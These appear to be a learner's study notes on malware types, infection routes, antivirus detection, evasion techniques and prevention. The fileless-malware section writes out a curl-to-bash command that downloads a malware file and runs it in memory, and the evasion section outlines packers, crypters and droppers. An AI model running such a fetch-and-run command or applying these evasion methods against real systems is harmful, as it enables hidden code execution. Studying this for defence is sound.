
# What is Malware

- A **Malware** is a set of instructions(program) that run on your computer and make your system do something that an attacker wants it to do.
```
	○ Malicious => ተንኮለኛ(bad thing) 
	○ Software => set of instruction(program) 
	■ Mal - ware
```

## What malwares do?

- Removing, Encrypting, Corrupting, Stealing data/files.
- Spying on user...

## Kinds of Malwares

Based on their **propagation/infection and attack**, there are many kinds of malwares. 
1. Trojan 
2. Worm 
3. Virus 
4. Ransomware 
5. Rootkit 
6. Adware

## 1. Trojan
- **looks legitimate** but can take control of your computer.
- A Trojan is designed to damage, disrupt, steal, or in general inflict some other harmful action on your data or network. 
- ● They **don’t replicate**.
- The name Trojan came from the **Greek mythology Trojan Horse**.
  - It describes how Greek soldiers were able to take the city of Troy after a fruitless ten-year siege by Giving Gift of giant horse by hiding soldiers inside of it, And then soldiers came out at night and evade the city of Troy.


  ## Common types of trojan

1. **Backdoor Trojan**: can create a “የጀርባ በር” on your computer. eg Vulnerable ports for Hackers.

2. **Mailfinder Trojan**: to **steal emails**.

3. **Remote Access Trojan (RAT):** This Trojan can give an attacker **full control over your computer via a remote** network connection. for stealing your information or spying on you.

   - **C2 Servers**(Command and Control): the hackers use this server for RAT.
   
4. **Trojan banker**: aim at your financial accounts. It’s designed to steal your account information for all the things you do online. That includes banking, credit card, and bill pay data.


## 2. Viruses

- older and famous malware.
- corrupt or delete data, damage/alter your files/data.
- Viruses can also **replicate themselves**.
### Common Signs Of Virus Infection

- ● **Speed of System decreeses** (bc viruses opens other processors)
- ● **Pop-up windows** (displayed on the screen and we click it)
- ● **Self-executing** (Apps run themselves)
- ● **Account being log out** 
- ● **Crashing of device** (viruses edit system files)
- ● **Mass emails being sent from you**
- ● **Files and system settings are altered.**

## Common types of virus

1.  **Resident Virus** : infecting applications on a host computer. (**affect running** applications/SWs)
   - i. **A non-resident virus**: is capable of infecting executable files when programs are **not running**.
   
2. **Multipartite Virus**: corrupt **partitions of harddesks**.

3. **Browser Hijacker**: a browser hijacker manually changes the settings of web browsers, such as replacing the homepage, editing the new tab page, and changing the default search engine. 
   - Technically, it is **not a virus because it cannot infect files**.


## 3. Worm

- They are like viruses. except worms can run on local networks.
- Jumps from computer to computers.
- ● A computer worm can **propagate or self-replicate** from one computer to another without human interaction after breaching a system.


# 4. Ransomware

- Ransomware is malware that employs encryption to hold a victim’s information at ransom.
- A **user or organization’s critical data is encrypted** so that they cannot access files, databases, or applications
- ★ Ransomware => RANSOM + SOFTWARE


## 5. Rootkit

- Designed to **gain unauthorized root or administrator-level access** to a computer system while concealing its presence and the presence of other malware.
- ● Rootkits allow attackers to maintain persistent control over a system, evade detection by security software, and perform various malicious activities.


## 6. Adware

- software that **displays unwanted advertisements** on your computer.
- ● Adware programs will tend to serve you **pop-up ads**, can change your browser's homepage, add spyware and just bombard your device with advertisements.


## 7. Botnet

- Network of Bots(robots).
- ● A type of malware that **infects multiple devices  (often called bots or zombies(slaves)**), enabling a hacker (known as: a **botmaster**) to **control those devices remotely** from a single command-and-control server.
- **Botnets**: are typically used for malicious activities such as launching **distributed denial-of-service (DDoS) attacks, sending spam emails, stealing data,** or performing other cybercrimes.


# Infection Techniques

- ● **USB drop attack** (**Delivery**) ( infected removable drives ).
	-  Hackers drop them around your company and when you plug it, BOOM!
- **● Spam emails** - malware by attachment.
- **● Malicious Office macros** (**Macro Viruses**)
    - Viruses of **WORD**, word has **VB**(visual basics programming language). 
    - Hackers write a malicious script in to VB. then, when we run it, it controls our computer. 
- ● **Softwares/Applications from unsafe websites.** 
    - ○**Torrent sites**: eg. search "pirate bay torent", "1317".. on google.(yetesereku negeroch yilekekubetal).
- ● **Using Cracked Softwares** 
     - In **Darkweb** there are **Stealers**: are types of **spyware**, but stealers steals our **saved password**s of browser.
     - *If the product is free, you are the product.*
- ● **Malicious Browser extension**: hackers write extensions to steal cookies, and other informations.
    - The safe extensions are installed from the browsers webstore. eg. For chrome: **`chrome web store`** , For firefox: **`firefox web store`** ....


## Anti-Virus(AV) Softwares

- A security tool designed to detect, prevent, and remove malicious software (malware) such as viruses, worms, Trojans, ransomware, and more.
- ● The **Antivirus Used Different Method to detect the Malware**: 
    - ○ Signature-Based Detection 
    - ○ Behaviour-Based Detection 
    - ○ Sandboxing


    ### Signature-Based Detection
    
- ● The antivirus software checks files against a database of known malware signatures (patterns unique to specific malware). If a match is found, the file is flagged as malicious.
- ● Ineffective against new or modified malware (zero-day threats), Means **UPDATE is MUST!!** 
- ● Those Signatures Can be Used As Indicator Of Compromise (IOC) By Blue Teamers.
- To look signature of files: **`cat fileName | xxd`**



   ### Behaviour-Based Detection
   
- Analyzes the **behavior of programs to identify suspicious** activities that could indicate the presence of malware.
- ● Even if the exact signature isn't in the database, abnormal behavior (e.g., modifying system files, connecting to known malicious domains,unauthorized data access) may trigger an alert.
- ● This May produce false positives by flagging legitimate software as suspicious.


  ## Sandboxing

- ● **Runs suspicious programs in a controlled, isolated environment** (a **sandbox**) to observe their behavior without affecting the system.
- If the program exhibits malicious behavior in the sandbox, it is flagged as malware.


# Anti-Virus(AV) Evasion techniques

- Bypassing or not been detected by Anti-Virus.
- **NB**. If something's signature is changed, It will not appear in the database.
1. **Packer**: is a program that compresses an executable to make it smaller. to loos something, signature will be changed.
	    - **Bypasses signature based detections**.
	    - Packing changes the Signature hashes
	    - It wraps the compressed executable in the code necessary to decompress itself at runtime.
2. **Crypters/encoders**: The crypter encrypts the original executable using an encryption algorithm — often something as simple as a XOR cipher with a unique key.
    -  **Like a packer**, its goal is to change the binary fingerprint of a file to avoid detection.
3. **Polymorphic malware**: (many-forms) - for different codes for each it has different signatures. 
   - This helps it evade signature-based detection, as there is no consistent pattern for the antivirus to recognize.
4. **Downloaders And Droppers**: they are not malicious by it self. but they check the computer detection methods and then they download viruses.
   - Many kinds of malware use programs called droppers or downloaders to learn about a system before installing the real malware.
   - Some of these droppers scope out a system first to avoid triggering security alerts when they download and install the real payload.
5. **Fileless Malware**: they have no file. load directly to RAM.
   - Fileless malware operates entirely in memory, without writing any files to disk.
   - BlueTeamers uses **memory forensics** technique for this malware. they dump from RAM to file. Then, To make different analysis use tool: `search on google: "memory volatility forensics"`
   - ● Since traditional antivirus software often focuses on scanning files, fileless malware can evade detection by avoiding the file system altogether.



#### Malware with file VS Fileless Malware

- **Malware with file**: when download with **curl** command: 
```
>   curl http://localhost:80/malware -o malware
>   ls              ...displays the malware file
```
- But, for **fileless malware**: after we download the malware, it do not make a file. load directly to RAM.
```
>   curl http://localhost:80/malware | bash
>   ls         
     ......no malware file here bc loaded into Bash directly
```


# Malware Prevention

1. **Install anti-virus and anti-spyware software**. 
      - a. Enable **real-time scanning to detect threats early**. 
      - b. Check for any Whitelisted Path/Directory 
           - i. Example: **kaspersky**, **avg**, **smadav**

2. **Keep AntiMalware Updated**

3. **Use secure authentication methods.**
     - a. 2-factor authentication 
     - b. **Implement email security and spam protection**

4. **Keep software updated**

5. **Use the least-privilege model.** (eg. dont use root user..)

6. **Monitor for suspicious activity** 
     - Dont click any pop-up..

7. **Backup strategy**: 
     - Maintain regular, offline backups of critical data.
     - Test backups periodically to ensure reliability.

8. **Educate your users**

